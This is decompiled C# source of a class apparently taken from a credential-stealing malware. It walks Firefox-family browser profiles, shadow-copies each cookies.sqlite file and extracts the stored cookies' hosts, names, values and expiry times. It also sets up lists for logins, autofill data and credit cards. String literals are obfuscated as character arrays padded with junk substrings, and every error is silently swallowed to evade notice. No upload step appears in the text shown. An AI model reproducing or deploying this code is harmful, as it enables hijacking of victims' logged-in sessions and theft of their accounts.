using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x02000006 RID: 6
public static class Gecko
{
	// Token: 0x06000019 RID: 25 RVA: 0x000031B0 File Offset: 0x000013B0
	public static List<ScannedBrowser> Scan(IList<string> paths)
	{
		List<ScannedBrowser> list = new List<ScannedBrowser>();
		try
		{
			foreach (string baseDirectory in from x in paths
			select Environment.ExpandEnvironmentVariables(x))
			{
				try
				{
					foreach (string text in FileCopier.FindPaths(baseDirectory, 2, 1, new string[]
					{
						new string(new char[]
						{
							'c',
							'o',
							'M',
							'A',
							'N',
							'G',
							'O',
							'o',
							'k',
							'i',
							'e',
							's',
							'.',
							's',
							'q',
							'M',
							'A',
							'N',
							'G',
							'O',
							'l',
							'i',
							't',
							'e'
						}).Replace("MANGO", string.Empty)
					}))
					{
						string fullName = new FileInfo(text).Directory.FullName;
						string text2 = text.Contains(Environment.ExpandEnvironmentVariables(new string(new char[]
						{
							'%',
							'U',
							'S',
							'E',
							'R',
							'P',
							'E',
							'n',
							'v',
							'i',
							'r',
							'o',
							'n',
							'm',
							'e',
							'n',
							't',
							'R',
							'O',
							'F',
							'I',
							'L',
							'E',
							'%',
							'\\',
							'A',
							'p',
							'p',
							'D',
							'E',
							'n',
							'v',
							'i',
							'r',
							'o',
							'n',
							'm',
							'e',
							'n',
							't',
							'a',
							't',
							'a',
							'\\',
							'R',
							'o',
							'a',
							'E',
							'n',
							'v',
							'i',
							'r',
							'o',
							'n',
							'm',
							'e',
							'n',
							't',
							'm',
							'i',
							'n',
							'g'
						}).Replace("Environment", string.Empty))) ? Gecko.GeckoRoamingName(fullName) : Gecko.GeckoLocalName(fullName);
						if (!string.IsNullOrEmpty(text2))
						{
							ScannedBrowser scannedBrowser = new ScannedBrowser
							{
								BrowserName = text2,
								BrowserProfile = new DirectoryInfo(fullName).Name,
								Cookies = new List<ScannedCookie>(Gecko.EnumCook(fullName)),
								Logins = new List<Account>(),
								Autofills = new List<Autofill>(),
								CC = new List<CC>()
							};
							if (!scannedBrowser.IsEmpty())
							{
								list.Add(scannedBrowser);
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x0600001A RID: 26 RVA: 0x000033AC File Offset: 0x000015AC
	private static List<ScannedCookie> EnumCook(string profile)
	{
		List<ScannedCookie> list = new List<ScannedCookie>();
		try
		{
			string text = Path.Combine(profile, new string(new char[]
			{
				'c',
				'o',
				'o',
				'k',
				'i',
				'e',
				's',
				'.',
				's',
				'q',
				'l',
				'i',
				't',
				'e'
			}));
			if (!File.Exists(text))
			{
				return list;
			}
			using (FileCopier fileCopier = new FileCopier())
			{
				DataBaseConnection dataBaseConnection = new DataBaseConnection(fileCopier.CreateShadowCopy(text));
				dataBaseConnection.ReadTable(new string(new char[]
				{
					'm',
					'o',
					'z',
					'_',
					'c',
					'o',
					'o',
					'k',
					'i',
					'e',
					's'
				}));
				for (int i = 0; i < dataBaseConnection.RowLength; i++)
				{
					ScannedCookie scannedCookie = null;
					try
					{
						scannedCookie = new ScannedCookie
						{
							Host = dataBaseConnection.ParseValue(i, new string(new char[]
							{
								'h',
								'o',
								's',
								't'
							})).Trim(),
							Http = dataBaseConnection.ParseValue(i, new string(new char[]
							{
								'h',
								'o',
								's',
								't'
							})).Trim().StartsWith("."),
							Path = dataBaseConnection.ParseValue(i, new string(new char[]
							{
								'p',
								'a',
								't',
								'h'
							})).Trim(),
							Secure = dataBaseConnection.ParseValue(i, new string(new char[]
							{
								'i',
								's',
								'S',
								'e',
								'c',
								'u',
								'r',
								'e'
							})).StartsWith("1"),
							Expires = long.Parse(dataBaseConnection.ParseValue(i, new string(new char[]
							{
								'e',
								'x',
								'p',
								'i',
								'r',
								'y'
							})).Trim()),
							Name = dataBaseConnection.ParseValue(i, new string(new char[]
							{
								'n',
								'a',
								'm',
								'e'
							})).Trim(),
							Value = dataBaseConnection.ParseValue(i, new string(new char[]
							{
								'v',
								'a',
								'l',
								'u',
								'e'
							}))
						};
					}
					catch
					{
					}
					if (scannedCookie != null)
					{
						list.Add(scannedCookie);
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600001B RID: 27 RVA: 0x000035F8 File Offset: 0x000017F8
	public static string GeckoRoamingName(string profilesDirectory)
	{
		string result = string.Empty;
		try
		{
			profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[]
			{
				'%',
				'a',
				'p',
				'p',
				'd',
				'a',
				't',
				'a',
				'%',
				'\\'
			})), string.Empty);
			string[] array = profilesDirectory.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			if (array[2] == new string(new char[]
			{
				'P',
				'r',
				'o',
				'f',
				'i',
				'l',
				'e',
				's'
			}))
			{
				result = array[1];
			}
			else
			{
				result = array[0];
			}
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x0600001C RID: 28 RVA: 0x00003688 File Offset: 0x00001888
	public static string GeckoLocalName(string profilesDirectory)
	{
		string result = string.Empty;
		try
		{
			profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[]
			{
				'%',
				'l',
				'o',
				'c',
				'a',
				'l',
				'a',
				'p',
				'p',
				'd',
				'a',
				't',
				'a',
				'%',
				'\\'
			})), string.Empty);
			string[] array = profilesDirectory.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			if (array[2] == new string(new char[]
			{
				'P',
				'r',
				'o',
				'f',
				'i',
				'l',
				'e',
				's'
			}))
			{
				result = array[1];
			}
			else
			{
				result = array[0];
			}
		}
		catch
		{
		}
		return result;
	}
}
